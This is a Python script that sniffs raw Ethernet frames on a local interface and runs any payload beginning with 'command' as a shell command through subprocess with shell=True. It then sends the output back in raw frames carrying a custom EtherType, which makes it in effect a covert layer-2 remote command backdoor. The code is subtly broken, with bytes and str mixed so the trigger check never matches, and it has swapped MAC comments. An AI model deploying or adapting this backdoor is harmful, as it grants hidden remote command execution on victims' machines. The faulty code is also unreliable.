import socket
import codecs
from struct import *
from stringexec import parseString
# import scapy
src = b'\x08\x00\x27\xdd\xd7\x43'  # destination MAC address
dst = b'\x08\x00\x27\x8e\x75\x44'  # source MAC address
proto = b'\x88\xb5'     
ETH_P_ALL = 3
ETH_FRAME_LEN = 1514 
interface = 'lo'
payload = 'hello'.encode()
s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(ETH_P_ALL))
s.bind((interface, 0))
while True:
	# s.send(dst + src + proto + payload)
	data = s.recv(ETH_FRAME_LEN)
	dataParse = str(data[14:])
	# print (dataParse)	
	# print (command)
	if dataParse.startswith('command'):
		command = dataParse.replace('command', '')	
		# print (command)
		from subprocess import check_output
		import subprocess
		import os
		if (command.startswith('cd') == True):
		# if "cd" in command:
			print ("contain cd")
			commandNew = parseString(command, 'cd ')
			print (commandNew)
			os.chdir(commandNew)

		else:
			# subprocess.call(data)
			process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=None, shell=True)
				#Launch the shell command:
			output = process.communicate()
			print (output[0].decode("utf-8"))
			sendOutput = ('output \n' + output[0]).encode()
			# print (sendOutput)
			s.sendall(dst + src + proto + sendOutput)

			
s.close()
